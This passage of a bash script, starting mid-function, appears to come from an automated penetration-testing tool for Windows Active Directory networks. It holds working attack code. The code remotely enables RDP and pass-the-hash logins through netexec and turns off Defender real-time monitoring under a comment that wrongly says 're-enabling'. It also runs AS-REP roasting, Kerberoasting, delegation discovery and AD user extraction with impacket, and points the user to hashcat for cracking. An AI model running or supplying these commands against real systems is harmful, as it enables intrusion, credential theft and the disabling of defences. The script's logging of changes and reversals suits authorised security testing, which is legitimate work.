							if ! grep -i 'Ok.' ${DIR_VULNS}/smb/cme_${ip}_enabling_rdp; then
								$proxychains netexec smb ${host} -u "$Username" $cme_creds $kerberos -x 'netsh advfirewall firewall set rule group="Bureau à distance" new enable=Yes' < /dev/null >> ${DIR_VULNS}/smb/cme_${ip}_enabling_rdp 2>/dev/null
								#overwrite the $actual_modification and $future_modification variables if necessary
								actual_modification="$proxychains netexec smb ${host} -u "$Username" $cme_creds $kerberos -x 'netsh advfirewall firewall set rule group=\"Bureau à distance\" new enable=Yes'"
								future_modification="$proxychains netexec smb ${host} -u "$Username" $cme_creds $kerberos -x 'netsh advfirewall firewall set rule group=\"Bureau à distance\" new enable=No'"
							fi
							#Restart RDP service on the machine
							$proxychains netexec smb ${host} -u "$Username" $cme_creds $kerberos -x 'powershell Restart-Service -Force -Name "TermService"' < /dev/null >> ${DIR_VULNS}/smb/cme_${ip}_enabling_rdp 2>/dev/null
							#Check the RDP service
							$proxychains netexec smb ${host} -u "$Username" $cme_creds $kerberos -x 'powershell Get-Service -Name "TermService"' < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_status_post_enabling_rdp 2>/dev/null
							if grep -qi 'Running' ${DIR_VULNS}/smb/cme_${ip}_status_post_enabling_rdp;then
								orange_log "${SPACE}[💀] RDP is now activate (it wasn't) on $host (${ip}) -> Changement added in $DIR/modifs.txt"
								 echo -e "\nACTION : Enabling RDP on $host (${ip}" >> $DIR/modifs.txt
								 echo "$proxychains netexec smb ${host} -u "$Username" $cme_creds $kerberos -x 'reg add \"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f'" >> $DIR/modifs.txt
								 echo "$actual_modification" >> $DIR/modifs.txt
								 echo "$proxychains netexec smb ${host} -u "$Username" $cme_creds $kerberos -x 'powershell Restart-Service -Force -Name \"TermService\"'" >> $DIR/modifs.txt
								 echo "$proxychains netexec smb ${host} -u "$Username" $cme_creds $kerberos -x 'powershell Get-Service -Name \"TermService\"'" >> $DIR/modifs.txt
								 echo "CORRECTION ->" >> $DIR/modifs.txt
								 echo "$proxychains netexec smb ${host} -u "$Username" $cme_creds $kerberos -x 'reg add \"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 1 /f'" | tee -a $DIR/modifs.txt $DIR/modifs_automation.txt > /dev/null
								 echo "$future_modification" | tee -a $DIR/modifs.txt $DIR/modifs_automation.txt > /dev/null
								 echo "$proxychains netexec smb ${host} -u "$Username" $cme_creds $kerberos -x 'powershell Stop-Service -Force -Name \"TermService\"'" | tee -a $DIR/modifs.txt $DIR/modifs_automation.txt > /dev/null
								 echo "$proxychains netexec smb ${host} -u "$Username" $cme_creds $kerberos -x 'powershell Get-Service -Name \"TermService\"'" | tee -a $DIR/modifs.txt $DIR/modifs_automation.txt > /dev/null
								 echo "$ip" >> $DIR_PORTS/3389.txt
							else
								rm ${DIR_VULNS}/smb/cme_${ip}_status_post_enabling_rdp
							fi
						fi
						###### RESTRICTED ADMIN #####
						# Will permit to connect with NTLM Hash
						$proxychains timeout $CME_TIMEOUT netexec smb ${host} -u "$Username" $cme_creds $kerberos -x 'reg query HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin' < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_cmd_rdp_restricted 2>/dev/null
						
						check_smb=$(grep -aEi '0x0' ${DIR_VULNS}/smb/cme_${ip}_cmd_rdp_restricted | wc -l)
						if [ "$check_smb" -gt 0 ]; then
							red_log "${SPACE}[!] Pass-The-Hash already allowed for RDP ! -> Possible old compromission"
							rm ${DIR_VULNS}/smb/cme_${ip}_cmd_rdp_restricted
						else
							$proxychains netexec smb ${host} -u "$Username" $cme_creds $kerberos -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f'  < /dev/null 2>/dev/null
							orange_log "${SPACE}[💀] New possibility to Pass-The-Hash enabled on RDP -> Changement added in $DIR/modifs.txt"
							echo -e "\nACTION :" >> $DIR/modifs.txt
							echo "$proxychains netexec smb ${host} -u "$Username" $cme_creds $kerberos -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f'" >> $DIR/modifs.txt
							echo "CORRECTION ->" >> $DIR/modifs.txt
							echo "$proxychains netexec smb ${host} -u "$Username" $cme_creds $kerberos -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x1 /f'" | tee -a $DIR/modifs.txt $DIR/modifs_automation.txt > /dev/null
						fi
						
						#Re-enabling RealTimeMonitoring
						$proxychains netexec smb $host -u "$Username" $cme_creds $kerberos -x 'powershell Set-MpPreference -DisableRealTimeMonitoring $true' < /dev/null
						
					fi
				fi
			fi
		done
	fi
}

web () {
	# Parcourir le fichier Nmap
	log "[🔍] Check Web Servers ..."
	while IFS= read -r line; do
		if [[ $line == "Nmap scan report for"* ]]; then
			# Extraire l'adresse IP
			ip=$(echo "$line" | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}')
			hostname=$(grep -E "^$ip:" $DIR/hostname_file.txt | awk -F ":" '{print $2}')
		elif [[ $line =~ ^([0-9]+)/tcp ]]; then
			# Extract port number and protocol
			port="${BASH_REMATCH[1]}"
			if [[ $line =~ (http|https) && ! $line =~ ncacn_http ]]; then
			  whatweb ${ip}:${port} --log-brief=/tmp/whatweb >/dev/null 2>&1
			  HTTPServer=$(cat /tmp/whatweb | grep -oP 'HTTPServer\[\K[^\]]+')
			  Title=$(cat /tmp/whatweb | grep -oP 'Title\[\K[^\]]+' || echo "Pas de Title")
			  green_log "${SPACE}${ip}:${port} ($hostname) -> ${HTTPServer} /// ${Title}"
			  rm /tmp/whatweb
			fi
			# Ajouter l'IP à son fichier correspondant
			#echo "$ip" >> "${DIR_PORTS}/${port}.txt"
		fi
	done < "$DIR/scan_nmap/scan_Fast_TCP.nmap"
}

users () {
	if [[ -e "${DIR_PORTS}/88.txt" ]]; then
		DC_ip=$(cat "${DIR_PORTS}/88.txt" | head -n 1)
		hostname=$(grep -E "^$DC_ip:" $DIR/hostname_file.txt | awk -F ":" '{print $2}')
		DC_host="$(echo $hostname | cut -d '.' -f 1)"
		domain=$(echo "$hostname" | cut -d '.' -f 2-)
		log "[🔍] Extracting AD users ..."
		if [[ "$Username" != "anonymous" ]]; then
			if [ -n "$NT_Hash" ]; then
				$proxychains impacket-getTGT -hashes ":${NT_Hash}" $domain/$Username -dc-ip $DC_host > /dev/null 2>&1
			else
				$proxychains impacket-getTGT $domain/$Username:$Password -dc-ip $DC_host > /dev/null 2>&1
			fi
		fi
		if [[ -e "${Username}.ccache" ]]; then
			export KRB5CCNAME=${Username}.ccache
			AD_Users=$($proxychains impacket-GetADUsers $domain/$Username -no-pass -dc-host $DC_host -k -all | awk -F " " '{print $1}' | sed '1,6d')
			unset KRB5CCNAME
			rm ${Username}.ccache
			if [[ -n "$AD_Users" ]]; then
				green_log "${SPACE}[💀] Great, successful extraction -> $DIR/users.txt"
				echo "$AD_Users" >> $DIR/users.txt
				sort -u ${DIR}/users.txt -o ${DIR}/users.txt
			fi
		fi
	fi
}

########################### 	Kerberos    ###############################
asp (){
	if [[ -e "${DIR_PORTS}/88.txt" ]]; then
		DC_ip=$(cat "${DIR_PORTS}/88.txt" | head -n 1)
		hostname=$(grep -E "^$DC_ip:" $DIR/hostname_file.txt | awk -F ":" '{print $2}')
		DC_host="$(echo $hostname | cut -d '.' -f 1)"
		domain=$(echo "$hostname" | cut -d '.' -f 2-)
		mkdir $DIR_VULNS/krb
		log "[🔍] Starting asreproasting attack ..."
		if [[ "$Username" != "anonymous" ]]; then
			if [ -n "$NT_Hash" ]; then
				$proxychains impacket-getTGT -hashes ":${NT_Hash}" $domain/$Username -dc-ip $DC_host > /dev/null 2>&1
			else
				$proxychains impacket-getTGT $domain/$Username:$Password -dc-ip $DC_host > /dev/null 2>&1
			fi
		fi
		if [[ -e "${Username}.ccache" ]]; then
			export KRB5CCNAME=${Username}.ccache
			$proxychains impacket-GetNPUsers $domain/$Username -no-pass -dc-host $DC_host -k -request -outputfile $DIR_VULNS/krb/asreproasting_Users.txt > /dev/null 2>&1
			unset KRB5CCNAME
			rm ${Username}.ccache
		else
			$proxychains impacket-GetNPUsers -no-pass -usersfile ${DIR}/users.txt $domain/ -outputfile $DIR_VULNS/krb/asreproasting_Users.txt > /dev/null 2>&1
		fi
		if grep -q 'asrep' "$DIR_VULNS/krb/asreproasting_Users.txt"; then
			green_log "${SPACE}[💀] Great, there are asreproastable accounts found -> $DIR_VULNS/krb/asreproasting_Users.txt"
			blue_log "${SPACE} [+] Use hashcat -m 18200 ... to bang them passwords"
		fi
	fi
}

krb () {
	if [[ -e "${DIR_PORTS}/88.txt" ]]; then
		DC_ip=$(cat "${DIR_PORTS}/88.txt" | head -n 1)
		hostname=$(grep -E "^$DC_ip:" $DIR/hostname_file.txt | awk -F ":" '{print $2}')
		DC_host="$(echo $hostname | cut -d '.' -f 1)"
		domain=$(echo "$hostname" | cut -d '.' -f 2-)
		mkdir $DIR_VULNS/krb
		log "[🔍] Check for SPN users (kerberoast) ..."
		if [[ "$Username" != "anonymous" ]]; then
			if [ -n "$NT_Hash" ]; then
				$proxychains impacket-getTGT -hashes ":${NT_Hash}" $domain/$Username -dc-ip $DC_host > /dev/null 2>&1
			else
				$proxychains impacket-getTGT $domain/$Username:$Password -dc-ip $DC_host > /dev/null > /dev/null 2>&1
			fi
		fi
		if [[ -e "${Username}.ccache" ]]; then
			export KRB5CCNAME=${Username}.ccache
			rm $DIR_VULNS/krb/Kerberoasting_SPN_Users.txt
			$proxychains impacket-GetUserSPNs $domain/$Username -no-pass -k -request -dc-host $DC_host >> $DIR_VULNS/krb/Kerberoasting_SPN_Users.txt
		else
			if [[ -e "$DIR_VULNS/krb/asreproasting_Users.txt" ]];then
				while IFS= read -r line; do
					asp_user=$(echo "$line" |awk -F'$' '{print $4}' |awk -F'@' '{print $1}')
					$proxychains impacket-GetUserSPNs -no-preauth $asp_user -usersfile ${DIR}/users.txt -dc-host $DC_host -request $domain/ >> $DIR_VULNS/krb/Kerberoasting_SPN_Users_preauth.txt
				done < "$DIR_VULNS/krb/asreproasting_Users.txt"
			fi
		fi

		if { ! grep -q 'No entries' "$DIR_VULNS/krb/Kerberoasting_SPN_Users.txt" && [[ -e "$DIR_VULNS/krb/Kerberoasting_SPN_Users.txt" ]] ; } || grep -q 'krb5tgs' "$DIR_VULNS/krb/Kerberoasting_SPN_Users_preauth.txt"; then
			green_log "${SPACE}[💀] Great, there are kerberoastable accounts found -> $DIR_VULNS/krb/Kerberoasting_SPN_Users.txt"
			blue_log "${SPACE} [+] Use hashcat -m 13100 ... to bang them passwords"
		fi
		
		#delegation
		log "[🔍] Searching delegations .."
		if [[ -e "${Username}.ccache" ]]; then
			export KRB5CCNAME=${Username}.ccache
			$proxychains impacket-findDelegation $domain/$Username -no-pass -k -dc-host $DC_host > $DIR_VULNS/krb/Delegations.txt
			unset KRB5CCNAME
			rm ${Username}.ccache
		fi
		if cat "$DIR_VULNS/krb/Delegations.txt" | grep -q 'AccountName';then
			echo $delegation_request >> $DIR_VULNS/Vulns_delegation.txt;
			green_log "[💀] Delegations found -> $DIR_VULNS/krb/Delegations.txt"
		fi
	fi
}

nmap_full () {
	
	PORTS_FOUND=$(ls ${DIR_PORTS}/*.txt | xargs -n 1 basename | sed 's/\.txt$//' | paste -sd ",")
	log "[🔍] Scanning NMAP - Full version"
	
	if [ -n "$proxychains" ]; then
		#Proxychains ne comprenant pas les requetes personnalisé, nous lui indiqueront de faire des requetes full (sT)
		#$proxychains nmap -Pn -A -sT -sCV -iL $DIR/hosts.txt -oA $DIR/scan_nmap/scan_Full_TCP -p${PORTS_FOUND} --open >/dev/null 2>&1
		if [ -e $DIR/scan_nmap/scan_Fast_TCP.nmap ];then
			cp $DIR/scan_nmap/scan_Fast_TCP.nmap $DIR/scan_nmap/scan_Full_TCP.nmap
			cp $DIR/scan_nmap/scan_Fast_TCP.xml $DIR/scan_nmap/scan_Full_TCP.xml
		else
			blue_log "Do a more in depth nmap on the distant internal network to continue :"
			blue_log "nmap -Pn -A -sT -sCV $rangeIP -oA scan_Full_TCP -p- --open"
			blue_log "Then exfiltrate nmap reports to '$DIR/scan_nmap/' on the attacker's machine"
			log "Press Entrer when ready ..."
			read
			nmap_full
		fi
	else
		nmap -sT -Pn -A -sCV -T4 -iL $DIR/hosts.txt -oA $DIR/scan_nmap/scan_Full_TCP -p${PORTS_FOUND} --open >/dev/null 2>&1
		
	fi
	
	#Deleting useless files
	if [ -n "$(ls ${DIR}/scan_nmap/*.gnmap 2>/dev/null)" ]; then
		rm $DIR/scan_nmap/*.gnmap
	fi
	
	xsltproc $DIR/scan_nmap/scan_Full_TCP.xml -o /tmp/scan_Full_TCP.html
	xsltproc $DIR/scan_nmap/scan_Full_UDP.xml -o /tmp/scan_Full_UDP.html
	#Suppression des filtered|opened
	awk 'BEGIN { RS="</tr>" } /open\|filtered/ { next } { printf "%s", $0 "</tr>" }' /tmp/scan_Full_UDP.html > /tmp/scan_Full_UDP_open.html
	
	log "${SPACE}File TCP in HTML format available to -> /tmp/scan_Full_TCP.html"
	log "${SPACE}File UDP in HTML format available to -> /tmp/scan_Full_UDP_open.html"
}

########################### TREE COMMAND ##################################
say_bye () {
	echo "⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐" >> $logfile
	echo "$(tree $DIR)"
	echo "$(tree $DIR)" >> $logfile
	echo "⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐" >> $logfile
	log "Elapsed Time: $(python3 -c "import datetime;print(str(datetime.timedelta(seconds=$(( SECONDS - start )))))")"
	log "Good Bye !!"
	exit
}


# Déclaration des fonctions
declare -a functions=(nmap_fast relay manspider vulns ftp ssh winrm rdp smtp nfs vnc zt printers snmp ldap ipmi mssql smb asp users krb web nmap_full)
declare -a functions_long_names=("Ports scan, Service versions scan" "Responder + NTLMRelayx" "Search sensitive elements (password, username, .. etc) on SMB Shares" "ms17-010, nopac, zerologon, MSOL creds, GPP_autologin, GPP_password, ..." "FTP enumeration" "SSH enumeration" "NFS enumeration" "WinRm enumeration" "RDP enumeration" "NFS enumeration" "VNC enumeration" "Zone Transfer DNS" "Looking for printers" "Looking for SNMP public communities" "Anonymous LDAP" "ipmi enumeration" "MSSQL authentication" "anonymous auth., guest auth., shares, users, lsa, dpapi, rdp session .." PrintersScan "Try ASRepRoasting Attack" "Get-ADUsers" "Try Kerberoasting Attack" "Try to identify web services" "Deep Nmap")

###################		 HELP 	##############################
Help() {
    echo "Usage: $0 -o ProjectName -i Interface -t rangeIP [-u Username [-p Password | -n NT_Hash]] -f"
    echo
    echo "Options:"
    echo "  -o  Project name (output directory)"
	echo "  -i  Network interface"
	echo "  -t  IP range (e.g., 192.168.1.17/32 or 192.168.1.128/27)"
    echo "  -u  Username (optional)"
    echo "  -p  Password (optional, either Password or NT_Hash must be provided, can be empty)"
    echo "  -H  NTLM Hash (optional, either Password or NT_Hash must be provided, can be empty)"
    echo "  -f  Execute all functions"
	echo "  -e  Execute all functions, but exclude specific functions (-e rdp,winrm)"
    echo "  -s  Select specific functions (-s rdp,winrm)"
    echo "  -r  Restore modifications"
    echo "  -h  Display help"
	echo
    echo "Available functions:"
    for i in "${!functions[@]}"; do
        printf "  - %-12s : %s\n" "${functions[$i]}" "${functions_long_names[$i]}"
    done
    exit 1
}

while getopts "o:i:u:p:H:t:e:s:fhr" option; do
    case $option in
        o) ProjectName=$OPTARG;;
		i) INTERFACE=$OPTARG;;
        u) Username=$OPTARG;;
        p) Password=$OPTARG;;
        H) NT_Hash=$OPTARG;;
        t) rangeIP=$OPTARG;;
        f) execute_all=true;;
		e) excluded_funcs=$OPTARG;;
        s) selected_funcs=$OPTARG;;
        r) restore=true;;
        h) Help;;
        \?) echo "Erreur : Option invalide"; Help;;
    esac
done

# Check mandatory parameters
if [[ -z "$ProjectName" || -z "$INTERFACE" || -z "$rangeIP" ]]; then
    echo "Error :All mandatory parameters have to be set."
    Help
    exit 1
fi

# Check Password / NT_Hash
if [[ -n "$Password" && -n "$NT_Hash" ]]; then
    echo "Error : You can't set Password and NTLMHash in the same time."
    exit 1
fi

# Execute all functions
if [[ $execute_all ]]; then
    domain=""
	starter
    for f in ${functions[@]}; do 
        $f
    done 
    say_bye
fi

# Execute specific functions
if [[ -n "$selected_funcs" ]]; then
    starter
    IFS=',' read -ra selected_funcs_arr <<< "$selected_funcs"
    for f in ${functions[@]}; do 
        for s in "${selected_funcs_arr[@]}"; do
            if [ "$s" == "$f" ];then
                $s
            fi
        done
    done
    say_bye
fi

# Exclude some functions
if [[ -n "$excluded_funcs" ]]; then
    starter
    IFS=',' read -ra excluded_funcs_arr <<< "$excluded_funcs"
    printf "%s\n" "${functions[@]}" > .functions.tmp
    printf "%s\n" "${excluded_funcs_arr[@]}" > .excluded_funcs.tmp
    filtered=$(comm -3 .functions.tmp .excluded_funcs.tmp)
    for f in $filtered;do
        $f
    done
    rm -rf .functions.tmp .excluded_funcs.tmp
    say_bye
fi

# Restore modifications
if [[ $restore ]]; then
    commands=$(cat $DIR/modifs.txt)
    while IFS= read -r command; do
        eval $command
    done < "$DIR/modifs_automation.txt"
    exit
fi
